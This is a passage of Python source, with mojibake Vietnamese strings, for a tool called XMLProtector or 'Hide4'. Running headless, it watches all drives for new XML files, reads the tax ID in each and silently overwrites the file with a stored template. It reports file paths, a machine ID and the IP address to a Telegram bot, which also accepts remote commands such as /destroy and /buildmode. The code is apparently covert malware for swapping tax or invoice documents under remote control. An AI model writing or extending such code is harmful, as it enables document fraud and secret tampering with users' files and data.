                    ping_msg = f"üèì <b>Pong!</b>\n" \
                              f"‚è∞ XMLProtector ƒëang ho·∫°t ƒë·ªông\n" \
                              f"üì° Bot ph·∫£n h·ªìi nhanh: OK"
                    send_telegram_message(ping_msg)
                elif text == '/status':
                    check_status_report()
                elif text == '/destroy':
                    destroy_xmlprotector()
                elif text == '/buildmode':
                    build_mode_msg = f"üîß <b>CH·∫æ ƒê·ªò BUILD EXE M·ªöI</b>\n\n" \
                                    f"üìÅ <b>H∆∞·ªõng d·∫´n:</b>\n" \
                                    f"1Ô∏è‚É£ G·ª≠i file XML template (1-10 files)\n" \
                                    f"2Ô∏è‚É£ Bot s·∫Ω t·ª± ƒë·ªông c·∫≠p nh·∫≠t templates\n" \
                                    f"3Ô∏è‚É£ Build EXE m·ªõi v·ªõi PyInstaller\n" \
                                    f"4Ô∏è‚É£ G·ª≠i l·∫°i EXE cho b·∫°n\n\n" \
                                    f"üì§ <b>B√¢y gi·ªù h√£y g·ª≠i file XML v√†o nh√≥m!</b>"
                    send_telegram_message(build_mode_msg)
                    set_build_mode(True)
                elif text == '/buildstatus':
                    status_msg = get_build_status_message()
                    send_telegram_message(status_msg)
                
                # X·ª≠ l√Ω document uploads (XML files)
            elif 'document' in message:
                chat_id = message['chat']['id']
                
                # Ch·ªâ ph·∫£n h·ªìi trong group ƒë∆∞·ª£c config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    continue
                
                document = message['document']
                file_name = document.get('file_name', '')
                file_id = document.get('file_id', '')
                
                # Ki·ªÉm tra xem c√≥ ph·∫£i file XML kh√¥ng v√† ƒëang trong build mode
                if file_name.endswith('.xml') and is_build_mode_active():
                    try:
                        # Download file t·ª´ Telegram
                        file_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
                        file_response = requests.get(file_url, params={'file_id': file_id})
                        file_data = file_response.json()
                        
                        if file_data.get('ok'):
                            file_path = file_data['result']['file_path']
                            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
                            
                            # Download file content
                            download_response = requests.get(download_url)
                            
                            if download_response.status_code == 200:
                                # L∆∞u file t·∫°m th·ªùi
                                temp_path = os.path.join(tempfile.gettempdir(), file_name)
                                with open(temp_path, 'wb') as f:
                                    f.write(download_response.content)
                                
                                # X·ª≠ l√Ω file XML
                                handle_xml_document(temp_path, file_name)
                                
                                # X√≥a file t·∫°m
                                os.remove(temp_path)
                            else:
                                raise Exception(f"Download failed: {download_response.status_code}")
                        else:
                            raise Exception(f"Get file info failed: {file_data}")
                    
                    except Exception as e:
                        error_msg = f"‚ùå <b>L·ªñI T·∫¢I XML</b>\n\n" \
                                   f"üìÑ File: {file_name}\n" \
                                   f"‚ö†Ô∏è L·ªói: {str(e)}"
                        send_telegram_message(error_msg)
                        logging.error(f"Failed to process XML document: {e}")
                
                elif file_name.endswith('.xml') and not is_build_mode_active():
                    # H∆∞·ªõng d·∫´n k√≠ch ho·∫°t build mode
                    guide_msg = f"üí° <b>H∆Ø·ªöNG D·∫™N UPLOAD XML</b>\n\n" \
                               f"üìÑ ƒê√£ nh·∫≠n file: {file_name}\n" \
                               f"‚ö†Ô∏è C·∫ßn b·∫≠t ch·∫ø ƒë·ªô BUILD tr∆∞·ªõc\n\n" \
                               f"üîß Nh·∫•n /menu ‚Üí 'BUILD EXE M·ªöI'\n" \
                               f"üì§ Sau ƒë√≥ g·ª≠i l·∫°i file XML n√†y"
                    send_telegram_message(guide_msg)
                    
            # X·ª≠ l√Ω callback queries (button presses)
            elif 'callback_query' in update:
                logging.info("üî• CALLBACK QUERY DETECTED!")
                callback_query = update['callback_query']
                chat_id = callback_query['message']['chat']['id']
                logging.info(f"üî• Callback from chat_id: {chat_id}, expected: {TELEGRAM_GROUP_ID}")
                
                # Ch·ªâ ph·∫£n h·ªìi trong group ƒë∆∞·ª£c config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    logging.warning(f"üö´ Callback rejected - wrong chat_id: {chat_id}")
                    continue
                    
                logging.info("‚úÖ Callback accepted - processing...")
                try:
                    process_callback_query(callback_query)
                    
                    # Answer callback query to remove loading spinner
                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                    answer_response = requests.post(answer_url, data={'callback_query_id': callback_query['id']})
                    logging.info(f"Callback answered: {callback_query.get('data', 'unknown')}")
                    
                except Exception as callback_error:
                    logging.error(f"Callback processing error: {callback_error}")
                    # Still answer callback to remove spinner
                    answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                    requests.post(answer_url, data={'callback_query_id': callback_query['id'], 'text': 'ƒê√£ c√≥ l·ªói x·∫£y ra!'})
            
            # Mark update as processed
            mark_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            requests.get(mark_url, params={'offset': update_id + 1})
        
    except Exception as e:
        logging.error(f"Process Telegram commands error: {e}")

def check_github_build_status():
    """Ki·ªÉm tra tr·∫°ng th√°i build t·ª´ GitHub Actions"""
    try:
        url = "https://api.github.com/repos/Mrkent1/Xml/actions/runs"
        headers = {
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            runs = response.json().get("workflow_runs", [])
            if runs:
                latest_run = runs[0]
                run_id = latest_run["id"]
                status = latest_run["status"]
                conclusion = latest_run.get("conclusion", "running")
                workflow_name = latest_run["name"]
                created_at = latest_run["created_at"]
                
                if status == "completed":
                    if conclusion == "success":
                        # Build th√†nh c√¥ng - g·ª≠i th√¥ng b√°o
                        success_msg = f"üéâ <b>GITHUB ACTIONS BUILD TH√ÄNH C√îNG!</b>\n\n" \
                                     f"‚úÖ Workflow: {workflow_name}\n" \
                                     f"üÜî Run ID: {run_id}\n" \
                                     f"‚è∞ Ho√†n t·∫•t: {created_at}\n\n" \
                                     f"üì• <b>T·∫£i EXE:</b>\n" \
                                     f"‚Ä¢ V√†o <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                     f"‚Ä¢ T·∫£i artifact 'XMLProcessor-EXE'\n\n" \
                                     f"üöÄ <b>EXE ƒë√£ s·∫µn s√†ng s·ª≠ d·ª•ng!</b>"
                        send_telegram_message(success_msg)
                        return True
                    else:
                        # Build th·∫•t b·∫°i
                        error_msg = f"‚ùå <b>GITHUB ACTIONS BUILD TH·∫§T B·∫†I!</b>\n\n" \
                                   f"‚ùå Workflow: {workflow_name}\n" \
                                   f"üÜî Run ID: {run_id}\n" \
                                   f"‚è∞ Th·ªùi gian: {created_at}\n\n" \
                                   f"üîç <b>Ki·ªÉm tra l·ªói:</b>\n" \
                                   f"‚Ä¢ V√†o <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                   f"‚Ä¢ Xem log l·ªói chi ti·∫øt"
                        send_telegram_message(error_msg)
                        return False
                else:
                    # ƒêang build
                    building_msg = f"‚è≥ <b>GITHUB ACTIONS ƒêANG BUILD...</b>\n\n" \
                                  f"üîÑ Workflow: {workflow_name}\n" \
                                  f"üÜî Run ID: {run_id}\n" \
                                  f"‚è∞ B·∫Øt ƒë·∫ßu: {created_at}\n\n" \
                                  f"üì± <b>Theo d√µi:</b>\n" \
                                  f"‚Ä¢ V√†o <a href='https://github.com/Mrkent1/Xml/actions/runs/{run_id}'>Run Details</a>\n" \
                                  f"‚Ä¢ Xem log real-time"
                    send_telegram_message(building_msg)
                    return None
        else:
            logging.error(f"GitHub API error: {response.status_code}")
            return False
            
    except Exception as e:
        logging.error(f"Check GitHub build status failed: {e}")
        return False

class DownloadHandler(FileSystemEventHandler):
    """X·ª≠ l√Ω s·ª± ki·ªán t·∫°o/rename file .xml ƒë·ªÉ ghi ƒë√® t·ª± ƒë·ªông."""
    def __init__(self, templates_map):
        super().__init__()
        self.templates = templates_map
        self.processed = load_processed_files()

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.try_overwrite(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.try_overwrite(event.dest_path)

    def try_overwrite(self, dest):
        # Kh√¥ng x·ª≠ l√Ω c√°c file n·∫±ng trong _MEIPASS/templates
        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
            tpl_dir = os.path.join(base, 'templates') + os.sep
            if dest.startswith(tpl_dir):
                return
        
        # üîí KH√îNG x·ª≠ l√Ω file trong th∆∞ m·ª•c ORIGINAL_TEMPLATES_SAFE
        safe_dir = os.path.join(os.getcwd(), 'ORIGINAL_TEMPLATES_SAFE') + os.sep
        if dest.startswith(safe_dir):
            logging.info(f"üîí B·∫£o v·ªá file g·ªëc: {dest}")
            return
        
        # üîí KH√îNG x·ª≠ l√Ω file trong th∆∞ m·ª•c PROTECTED_XML_FILES_SAFE
        protected_dir = os.path.join(os.getcwd(), 'PROTECTED_XML_FILES_SAFE') + os.sep
        if dest.startswith(protected_dir):
            logging.info(f"üîí B·∫£o v·ªá file PROTECTED: {dest}")
            return

        time.sleep(1)  # ƒë·ª£i file kh√¥ng c√≤n b·ªã kh√≥a
        try:
            # ƒê·ªçc n·ªôi dung file c·∫ßn ghi ƒë√®
            with open(dest, 'r', encoding='utf-8') as f: 
                dst_content = f.read()
            
            # üöÄ S·ª¨ D·ª§NG SMART TEMPLATE MATCHING thay v√¨ ch·ªâ MessageId
            # Extract MST tr∆∞·ªõc ƒë·ªÉ t√¨m file template g·ªëc
            mst = extract_mst_from_xml(dst_content)
            
            if mst:
                # T√¨m file template g·ªëc ƒë·ªÉ copy 100%
                template_file = find_template_file_by_mst(mst)
                if template_file:
                    # Copy 100% file template g·ªëc
                    shutil.copy2(template_file, dest)
                    logging.info(f"‚úÖ SMART OVERWRITE 100% SUCCESS: {dest}")
                    
                    # Send Telegram notification for successful overwrite
                    file_name = os.path.basename(dest)
                    overwrite_msg = f"‚ö° <b>Ghi ƒê√® Th√†nh C√¥ng 100%</b>\n" \
                                   f"üìÑ File: {file_name}\n" \
                                   f"üè¢ MST: {mst}\n" \
                                   f"üìÇ ƒê∆∞·ªùng d·∫´n: {os.path.dirname(dest)}"
                    send_telegram_message(overwrite_msg)
                    
                    send_remote_log("Smart Overwrite 100% Success", dest, once=False)
                    self.processed.add(dest)
                    save_processed_files(self.processed)
                    return
                else:
                    logging.warning(f"Template file NOT FOUND for MST: {mst}, fallback to content overwrite")
            
            # Fallback: s·ª≠ d·ª•ng smart template matching
            smart_template = find_template_instant(dst_content, dest)
            
            if smart_template:
                # Ki·ªÉm tra n·∫øu n·ªôi dung kh√°c nhau th√¨ m·ªõi ghi ƒë√®
                if dst_content != smart_template:
                    # Fallback: ghi ƒë√® n·ªôi dung
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(smart_template)
                    logging.info(f"‚úÖ SMART OVERWRITE CONTENT SUCCESS: {dest}")
                    
                    # Send Telegram notification for successful overwrite
                    file_name = os.path.basename(dest)
                    overwrite_msg = f"‚ö° <b>Ghi ƒê√® Th√†nh C√¥ng (Content)</b>\n" \
                                   f"üìÑ File: {file_name}\n" \
                                   f"üè¢ MST: {mst or 'Kh√¥ng x√°c ƒë·ªãnh'}\n" \
                                   f"üìÇ ƒê∆∞·ªùng d·∫´n: {os.path.dirname(dest)}"
                    send_telegram_message(overwrite_msg)
                    
                    send_remote_log("Smart Overwrite Content Success", dest, once=False)
                    self.processed.add(dest)
                    save_processed_files(self.processed)
                else:
                    logging.info(f"üîÑ Smart check: File already up-to-date: {dest}")
                    return
            else:
                # Fallback v·ªÅ logic c≈© n·∫øu smart kh√¥ng t√¨m ƒë∆∞·ª£c
                logging.warning(f"‚ö†Ô∏è Smart template not found, fallback to MessageId matching")
                
                # Logic c≈© - x·ª≠ l√Ω message ID
                filename = Path(dest).stem
                match = re.match(r'^(.*?)(?: \(\d+\))?$', filename)
                if not match:
                    return
                msg_id = match.group(1).split('_')[-1]
                src = self.templates.get(msg_id)
                if not src:
                    logging.warning(f"‚ö†Ô∏è No template found for MessageId: {msg_id}")
                    return
                    
                with open(src, 'r', encoding='utf-8') as f: 
                    src_content = f.read()
                    
                if dst_content == src_content:
                    return  # B·ªè qua n·∫øu n·ªôi dung gi·ªëng nhau
                    
                shutil.copy2(src, dest)
                logging.info(f"‚úÖ Fallback overwrite success: {src} ‚Üí {dest}")
                send_remote_log("Fallback Overwrite Success", dest, once=False)
                self.processed.add(dest)
                save_processed_files(self.processed)
                
        except Exception as e:
            logging.error(f"‚ùå Ghi ƒë√® th·∫•t b·∫°i {dest}: {e}")
            send_remote_log(f"Overwrite failed: {str(e)}", dest, once=False)

def start_monitor():
    """Headless mode: log start v√† gi√°m s√°t to√†n PC."""
    send_remote_log("Ph·∫ßn m·ªÅm Hide4 kh·ªüi ch·∫°y", once=True)
    # add_to_startup()  # DISABLED to prevent duplicate processes

    # Kh·ªüi t·∫°o Machine Management System
    init_machine_management()
    
    templates = get_templates()
    template_count = len(templates)
    
    # Send Telegram startup notification v·ªõi Machine ID
    startup_msg = f"üõ°Ô∏è <b>XMLProtector Kh·ªüi ƒê·ªông</b>\n" \
                  f"üìÅ Templates ƒë√£ t·∫£i: {template_count}\n" \
                  f"üîç ƒêang gi√°m s√°t to√†n b·ªô ·ªï ƒëƒ©a\n" \
                  f"‚ö° Ghi ƒë√® th√¥ng minh: S·∫¥N S√ÄNG\n\n" \
                  f"ü§ñ <b>Machine Management:</b>\n" \
                  f"‚Ä¢ Machine ID: <code>{MACHINE_ID}</code>\n" \
                  f"‚Ä¢ Platform: {MACHINE_INFO.get('platform', 'Unknown')}\n" \
                  f"‚Ä¢ IP: {MACHINE_INFO.get('ip_address', 'Unknown')}"
    send_telegram_message(startup_msg)
    
    tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }

    handler  = DownloadHandler(tpl_map)
    observer = Observer()
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
        except:
            pass

    observer.start()
    send_remote_log("B·∫Øt ƒë·∫ßu gi√°m s√°t", ",".join(drives), once=True)
    
    # Setup Telegram bot v·ªõi exclusive access
    if get_bot_info():
        claim_bot_exclusive()
        clear_telegram_webhook()
        reset_telegram_updates()  # Flush old updates including callbacks
        time.sleep(3)  # Wait for complete setup
        logging.info("üöÄ Telegram bot ready - callbacks should work now!")
    else:
        logging.error("‚ùå Telegram bot kh√¥ng kh·∫£ d·ª•ng - t·∫Øt bot functions")

    try:
        # Main loop v·ªõi command processing t·ªëi ∆∞u
        command_check_interval = 0
        machine_status_interval = 0
        while True:
            time.sleep(0.5)  # Gi·∫£m t·ª´ 1s xu·ªëng 0.5s ƒë·ªÉ ph·∫£n h·ªìi nhanh h∆°n
            
            # Ki·ªÉm tra Telegram commands m·ªói 2 gi√¢y thay v√¨ 5 gi√¢y
            command_check_interval += 1
            if command_check_interval >= 4:  # 0.5s * 4 = 2s
                process_telegram_commands()
                command_check_interval = 0
            
            # C·∫≠p nh·∫≠t machine status m·ªói 5 ph√∫t
            machine_status_interval += 1
            if machine_status_interval >= 600:  # 0.5s * 600 = 5 ph√∫t
                update_machine_status()
                machine_status_interval = 0
                
    except KeyboardInterrupt:
        observer.stop()
        send_remote_log("Ph·∫ßn m·ªÅm ƒë√£ t·∫Øt", once=True)
    except Exception as e:
        logging.error(f"‚ùå Ph·∫ßn m·ªÅm g·∫∑p l·ªói: {e}")
        send_remote_log("Ph·∫ßn m·ªÅm g·∫∑p l·ªói", str(e), once=True)
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log v·ªõi control buttons."""
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("XMLProtector Control Panel")
    root.geometry("700x600")

    # Control buttons frame
    btn_frame = ctk.CTkFrame(root)
    btn_frame.pack(fill='x', padx=10, pady=10)
    
    def on_check_status():
        """Check status button handler."""
        try:
            check_status_report()
            messagebox.showinfo("Status", "Status report sent to Telegram!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send status: {e}")
    
    def on_destroy():
        """Destroy button handler."""
        result = messagebox.askyesno(
            "‚ö†Ô∏è DESTROY XMLProtector", 
            "Are you sure you want to COMPLETELY REMOVE XMLProtector?\n\n" +
            "This will:\n" +
            "‚Ä¢ Remove from startup\n" +
            "‚Ä¢ Delete all app data\n" +
            "‚Ä¢ Terminate protection\n\n" +
            "THIS CANNOT BE UNDONE!"
        )
        if result:
            try:
                destroy_xmlprotector()
            except:
                # Process will terminate, so this might not show
                messagebox.showinfo("Destroyed", "XMLProtector has been removed!")
    
    # Control buttons
    status_btn = ctk.CTkButton(
        btn_frame, 
        text="üìä Check Status", 
        command=on_check_status,
        fg_color="#2563eb",
        width=150
    )
    status_btn.pack(side='left', padx=5)
    
    destroy_btn = ctk.CTkButton(
        btn_frame, 
        text="üö® DESTROY", 
        command=on_destroy,
        fg_color="#dc2626",
        hover_color="#b91c1c",
        width=150
    )
    destroy_btn.pack(side='right', padx=5)

    # Templates list
    templates_label = ctk.CTkLabel(root, text="üìÅ Templates Loaded:")
    templates_label.pack(pady=(10,5))
    
    lb_tpl = Listbox(root, height=5)
    for p in get_templates():
        lb_tpl.insert(END, os.path.basename(p))
    lb_tpl.pack(fill='x', padx=10, pady=(0,10))

    # Log viewer
    log_label = ctk.CTkLabel(root, text="üìÑ Recent Activity Log:")
    log_label.pack(pady=(10,5))
    
    log_frame = ctk.CTkFrame(root)
    log_frame.pack(fill='both', expand=True, padx=10, pady=(0,10))

    lb_log = Listbox(log_frame)
    sb = Scrollbar(log_frame, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=5, pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()
if __name__ == '__main__' and '--test-log' in sys.argv:
    send_remote_log("Ki·ªÉm tra log t·ª´ Hide4", r"C:\temp\dummy.xml")
    sys.exit(0)